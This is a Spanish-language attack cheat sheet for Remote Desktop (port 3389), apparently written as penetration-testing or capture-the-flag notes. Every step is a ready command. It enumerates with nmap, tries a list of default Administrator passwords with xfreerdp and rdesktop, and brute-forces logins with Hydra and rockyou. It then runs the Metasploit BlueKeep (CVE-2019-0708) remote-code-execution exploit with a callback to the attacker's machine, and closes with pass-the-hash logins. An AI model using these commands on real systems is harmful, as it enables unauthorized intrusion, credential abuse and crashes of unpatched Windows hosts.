# Enumeración y Ataque — RDP (Puerto 3389)

## Descripción

RDP (Remote Desktop Protocol) es el protocolo de escritorio remoto de Windows. Permite acceso gráfico al sistema. Tiene vulnerabilidades críticas históricas como BlueKeep.

**Puerto por defecto:** 3389

---

## Paso 1 — Enumeración con Nmap

```shell
nmap -p 3389 -sV -sC TARGET_IP
nmap -p 3389 --script rdp-vuln-ms12-020 TARGET_IP
nmap -p 3389 --script rdp-enum-encryption TARGET_IP
```

---

## Paso 2 — Conexión con credenciales conocidas

```shell
# Desde Kali con xfreerdp
xfreerdp /u:Administrator /p:password /v:TARGET_IP
xfreerdp /u:usuario /p:contraseña /v:TARGET_IP /cert-ignore

# Con rdesktop
rdesktop -u Administrator -p password TARGET_IP
```

---

## Paso 3 — Credenciales por defecto

```
Administrator:(vacía)
Administrator:password
Administrator:admin
Administrator:123456
```

---

## Paso 4 — Fuerza bruta

```shell
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET_IP

# Con Metasploit
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS TARGET_IP
run
```

---

## Paso 5 — BlueKeep CVE-2019-0708 (Windows 7/2008 sin parchear) ⭐

Vulnerabilidad crítica de RCE sin autenticación:

```shell
# Verificar si es vulnerable
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS TARGET_IP
run

# Explotar (puede causar BSOD — usar con cuidado)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS TARGET_IP
set LHOST KALI_IP
run
```

---

## Paso 6 — Pass-the-Hash con RDP

Si tienes el hash NTLM de un usuario (sin necesidad de la contraseña en texto plano):

```shell
xfreerdp /u:Administrator /pth:HASH_NTLM /v:TARGET_IP
```

---

## Checklist rápido

```
[ ] nmap -sV -sC para ver versión
[ ] Credenciales por defecto con xfreerdp
[ ] Fuerza bruta con Hydra si tienes un usuario
[ ] BlueKeep si es Windows 7/2008 sin parchear
[ ] Pass-the-Hash si tienes hash NTLM
```
